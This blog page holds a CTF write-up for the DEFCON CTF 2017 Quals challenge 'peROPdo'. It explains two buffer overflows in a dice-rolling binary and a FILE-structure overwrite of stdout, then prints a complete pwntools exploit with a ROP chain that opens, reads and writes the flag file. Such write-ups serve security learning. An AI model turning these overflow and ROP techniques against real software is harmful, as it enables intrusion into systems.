<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.13.0 by Michael Rose
  Copyright 2013-2018 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE.txt
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>DEFCON CTF 2017 Quals – peROPdo - Hacking Tube 2.0</title>
<meta name="description" content="Category: Potent Pwnables">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Hacking Tube 2.0">
<meta property="og:title" content="DEFCON CTF 2017 Quals – peROPdo">
<meta property="og:url" content="http://0.0.0.0:4000/1784510/">


  <meta property="og:description" content="Category: Potent Pwnables">







  <meta property="article:published_time" content="2017-05-02T22:58:00+08:00">






<link rel="canonical" href="http://0.0.0.0:4000/1784510/">













<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Hacking Tube 2.0 Feed">

<!-- http://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if lte IE 9]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    <div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        <a class="site-title" href="/">Hacking Tube 2.0</a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/about" >About</a>
            </li><li class="masthead__menu-item">
              <a href="/archives/" >Archive</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categories</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Tags</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle Menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="http://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/other/gravatar.png" alt="Bruce Chen" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Bruce Chen</h3>
    
    
      <p class="author__bio" itemprop="description">
        Vulnerability researcher / CTFer
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="http://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Taiwan</span>
        </li>
      

      
        
          
            <li><a href="https://twitter.com/bruce30262"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
          
        
          
            <li><a href="https://github.com/bruce30262"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
          
        
          
            <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> RSS</a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="http://schema.org/CreativeWork">
    <meta itemprop="headline" content="DEFCON CTF 2017 Quals – peROPdo">
    <meta itemprop="description" content="Category: Potent Pwnables">
    <meta itemprop="datePublished" content="May 02, 2017">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">DEFCON CTF 2017 Quals – peROPdo
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p><strong>Category:</strong> Potent Pwnables</p>

<p>32 bit ELF, static link, stripped, NX enabled, No PIE &amp; canary.</p>

<!-- more -->

<p>The program is a “rolling dice” program. First we input our name, then the program will ask us how many dice would we like to roll. After we input a number, the program will start generating some random data, then store them on the stack memory. The program will then print out <code class="highlighter-rouge">data[i] % 6 + 1</code>, which represent the numbers we roll in this round.</p>

<p>There’re two vulnerabilities in the program. First it use <code class="highlighter-rouge">scanf("%s", name)</code> to read our name, which lead to buffer overflow in the <code class="highlighter-rouge">name</code> buffer. Then, if we input a number that is larger than <strong>23</strong>, the data that program generated will overflow the <code class="highlighter-rouge">data[i]</code> buffer and <strong>thus overwrite the return address</strong> ( it will be a random data though ).</p>

<p>Since the binary was stripped, I wasn’t sure which algorithm the program used for randomizing, the only thing I knew is that the algorithm will use our name to generate the random data. At that moment, I thought it was just some self-implement function ( which is <strong>NOT</strong> correct, we’ll get into that later).</p>

<p>And so I thought “Hmmm, maybe I could use some symbolic execution tool to calculate the address I want to return, and do the ROP attack”. <strong>This was such a huge mistake</strong>, since I’m not familiar with any of the symbolic execution tools – <a href="http://angr.io/">angr</a>, <a href="https://github.com/JonathanSalwan/Triton">Triton</a>, not to mention the fresh out <a href="https://github.com/trailofbits/manticore">manticore</a>. Even worse, all of the tool failed to calculate the address – Triton and manticore couldn’t even execute the program, it just crashed :(</p>

<p>After wasting lots of time with those symbolic execution tools, I decided to try something different – the first vulnerability: overflowing the <code class="highlighter-rouge">name</code> buffer. And the result was encouraging – since I found that I could hijack the control flow by using the <code class="highlighter-rouge">call reg</code> and the <code class="highlighter-rouge">call [reg+offset]</code> gadget ( we can control the content of several registers ). It seems that there’re some <code class="highlighter-rouge">FILE*</code> pointer behind the <code class="highlighter-rouge">name</code> buffer, so we can exploit the service by <a href="https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/">abusing the FILE structure</a> ( we can’t control the function parameters though).</p>

<p>Here I chose to use the second gadget ( <code class="highlighter-rouge">call [reg+offset]</code> ), since when the program execute to that line of code, its second parameter will be the <code class="highlighter-rouge">FILE*</code> pointer of <code class="highlighter-rouge">stdout</code>. I control the <code class="highlighter-rouge">eip</code> and jump to the middle of the main function:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mov     dword ptr [esp+4], offset name
mov     dword ptr [esp], (offset aSSSS+8) ; "%s" &lt;--- I jump to here
call    scanf
mov     eax, ds:name
mov     [esp], eax
call    sub_0804baf0
mov     dword ptr [esp], offset name
call    do_main
</code></pre></div></div>

<p>This will make the program store the <code class="highlighter-rouge">%s</code> string to the first parameter, then call the <code class="highlighter-rouge">scanf</code> function, making the program calling <code class="highlighter-rouge">scanf("%s", stdout)</code> – and thus we can control the content of <code class="highlighter-rouge">stdout</code> !</p>

<p>By crafting <code class="highlighter-rouge">stdout</code>, we can actually hijack the control flow, while having the first parameter controlled. This allowed us to do some advanced ROP attack. Here’s what I did after I controlled the <code class="highlighter-rouge">eip</code>:</p>
<ol>
  <li>Jump to <code class="highlighter-rouge">xchg esp, eax</code> gadget, migrate the stack to <code class="highlighter-rouge">stdout</code> (which now controlled by us)</li>
  <li>Use <code class="highlighter-rouge">add esp, offset</code> to skip the uncontrollable member data in <code class="highlighter-rouge">stdout</code></li>
  <li>Since it’s a static linked binary, it’s easy for us to find some gadgets and do the <strong>open/read/write</strong> syscall, making the service print out the flag of the challenge. (The <strong>execve</strong> syscall seems to be filtered out in this challenge)</li>
</ol>

<p>Final exploit:<br />
```python exp_peropdo.py 
#!/usr/bin/env python</p>

<p>from pwn import *
import subprocess
import sys
import time</p>

<p>HOST = “peropdo_bb53b90b35dba86353af36d3c6862621.quals.shallweplayaga.me”
PORT = 80
ELF_PATH = “./peropdo”</p>

<p>context.binary = ELF_PATH
context.log_level = ‘INFO’ # [‘CRITICAL’, ‘DEBUG’, ‘ERROR’, ‘INFO’, ‘NOTSET’, ‘WARN’, ‘WARNING’]
context.terminal = [‘tmux’, ‘splitw’] # for gdb.attach</p>

<p>elf = context.binary # context.binary is an ELF object</p>

<p>if <strong>name</strong> == “<strong>main</strong>”:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r = remote(HOST, PORT)
#r = process(ELF_PATH)

#gdb.attach(r, gdbscript=open("./ggg", "r"))
func = 0x0806d7aa # avoid crash
scanf = 0x08048b2a
name = p32(scanf) + p32(func) + "\x42"*972 + p32(0x80ecdf4) + '\x00'*92  + p32(0x80ecdf8) 
r.sendlineafter("name?", name)

# Later the program will call scanf("%s", stdout);
# now we can overwrite the whole stdout FILE structure

stream = p32(0x08079824) # second gadget: add esp, 0x84....
stream += "/home/peropdo/flag\x00" # flag path
stream = stream.ljust(0x1c, '\0')
stream += p32(0x804b45c) # eip, first gadget: xchg esp, eax ; ret
stream = stream.ljust(0x48, '\0')
stream += p32(0x080ED3E8) # pointer to null
stream = stream.ljust(0x90, '\0')
stream += p32(0x807982b) # third gadget: pop; ret
stream += p32(0x80eb2a0) # fake jump table

# 0x08074f2e : mov eax, 5 ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret 
# 0x08079465 : mov ebx, eax ; mov eax, ebx ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
pop_ebx = 0x806f322  # pop ebx;ret
pop_eax = 0x80e3525  # pop eax;ret
pop_ecx = 0x080e5ee1 # pop ecx ; ret 
pop_edx = 0x0806f2fa # pop edx ; ret
int80 = 0x806fae0    # int 0x80 ; ret 
buf = 0x80ed000-0x100
rop = flat(
            pop_ecx,
            0,
            pop_edx, 
            0,
            0x08074f2e, # mov eax = 5 (open), pop ebx...
            0x80eb2a4, # ptr to flag path
            [0,0,0],
            int80,              
            pop_eax,
            3, # read
            pop_ebx,
            3, #fd
            pop_ecx,
            buf,
            pop_edx,
            0x100,
            int80,
            pop_ebx,
            1, # fd,
            pop_eax,
            4, # write
            int80
          )

r.sendline(stream + rop)
r.interactive() ```
</code></pre></div></div>

<p>flag: <code class="highlighter-rouge">Thanks to Kenshoto for the inspiration! 5fbb34920c457b2e0855a174b8de3ebc</code></p>

<p>Later did I know (thanks to teammate <a href="https://poning.me/">Isaac</a>) that there’s a thing call <a href="https://www.hex-rays.com/products/ida/tech/flirt/index.shtml">FLIRT</a> in IDA Pro, which can help the user identify the function call in libc. All we need to do is download a FLIRT signature database from github ( <a href="https://github.com/push0ebp/sig-database">here’s</a> the DB I used for this challenge ), and use <strong>FILE –&gt; Load File –&gt; FLIRT signature file</strong> to load the database. IDA will then identify the function name, making the reverse engineering less painful. By using this technique, we’ll be able to identify some libc function, even the location of <code class="highlighter-rouge">stdout</code>.</p>

<p>And that’s when I found that the “self-implement random” function is actually just <code class="highlighter-rouge">srand()</code> &amp; <code class="highlighter-rouge">rand()</code> in libc. According to <a href="https://github.com/mehQQ">meh</a> from HITCON, you can just brute-force the desired return address. Moreover, because the <code class="highlighter-rouge">name</code> buffer address is right under the return address, so you can just use <code class="highlighter-rouge">pop esp; ret</code> to migrate the stack into <code class="highlighter-rouge">name</code> buffer, and do the ROP attack. Guess I still got a lot of shit to learn :/</p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#bof" class="page__taxonomy-item" rel="tag">BOF</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#c" class="page__taxonomy-item" rel="tag">C</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#ctf" class="page__taxonomy-item" rel="tag">CTF</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#defcon" class="page__taxonomy-item" rel="tag">DEFCON</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#file-stream-pointer-overflow" class="page__taxonomy-item" rel="tag">file_stream_pointer_overflow</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#pwnable" class="page__taxonomy-item" rel="tag">Pwnable</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#python" class="page__taxonomy-item" rel="tag">Python</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#rop" class="page__taxonomy-item" rel="tag">ROP</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#write-ups" class="page__taxonomy-item" rel="tag">write-ups</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2017-05-02T22:58:00+08:00">May 02, 2017</time></p>
        
      </footer>

      <section class="page__share">
  

  <a href="https://twitter.com/intent/tweet?text=DEFCON+CTF+2017+Quals+--+peROPdo%20http%3A%2F%2F0.0.0.0%3A4000%2F1784510%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2F0.0.0.0%3A4000%2F1784510%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>

  <a href="https://plus.google.com/share?url=http%3A%2F%2F0.0.0.0%3A4000%2F1784510%2F" class="btn btn--google-plus" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Google Plus"><i class="fab fa-fw fa-google-plus" aria-hidden="true"></i><span> Google+</span></a>

</section>


      
  <nav class="pagination">
    
      <a href="/33c3-ctf-2016-rec/" class="pagination--pager" title="33C3 CTF 2016 – rec
">Previous</a>
    
    
      <a href="/1784522/" class="pagination--pager" title="DEFCON CTF 2017 Quals – badint
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
    <div class="page__related">
      <h4 class="page__related-title">You May Also Enjoy</h4>
      <div class="grid__wrapper">
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/" rel="permalink">Chakrazy – exploiting type confusion bug in ChakraCore engine
</a>
      
    </h2>
    
    <p class="archive__item-excerpt" itemprop="description">Introduction

</p>
  </article>
</div>
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/" rel="permalink">Learning browser exploitation via 33C3 CTF  feuerfuchs challenge
</a>
      
    </h2>
    
    <p class="archive__item-excerpt" itemprop="description">Introduction

</p>
  </article>
</div>
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/hxp-CTF-2017-hardened-flag-store/" rel="permalink">hxp CTF 2017 – hardened_flag_store
</a>
      
    </h2>
    
    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable

</p>
  </article>
</div>
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/MeePwn-CTF-2017-Brainfuck-1-2/" rel="permalink">MeePwn CTF 2017 – Brainfuck 1 &amp; 2
</a>
      
    </h2>
    
    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable

</p>
  </article>
</div>
        
      </div>
    </div>
  
</div>
    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><input type="text" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
    <div id="results" class="results"></div></div>
      </div>
    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    
      
        
          <li><a href="https://creativecommons.org/licenses/by-nc-sa/3.0/"><i class="fab fa-fw fa-creative-commons" aria-hidden="true"></i> </a></li>
        
      
        
          <li><a href="https://creativecommons.org/licenses/by-nc-sa/3.0/"><i class="fab fa-fw fa-creative-commons-by" aria-hidden="true"></i> </a></li>
        
      
        
          <li><a href="https://creativecommons.org/licenses/by-nc-sa/3.0/"><i class="fab fa-fw fa-creative-commons-nc" aria-hidden="true"></i> </a></li>
        
      
        
          <li><a href="https://creativecommons.org/licenses/by-nc-sa/3.0/"><i class="fab fa-fw fa-creative-commons-sa" aria-hidden="true"></i> </a></li>
        
      
    

  </ul>
</div>

<div class="page__footer-copyright">&copy; 2018 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script src="https://use.fontawesome.com/releases/v5.3.1/js/all.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>




    
  <script>
    var disqus_config = function () {
      this.page.url = "http://0.0.0.0:4000/1784510/";  // Replace PAGE_URL with your page's canonical URL variable
      this.page.identifier = "/1784510"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
    };
    (function() { // DON'T EDIT BELOW THIS LINE
      var d = document, s = d.createElement('script');
      s.src = 'https://bruce30262logdown.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  </script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>


  



  </body>
</html>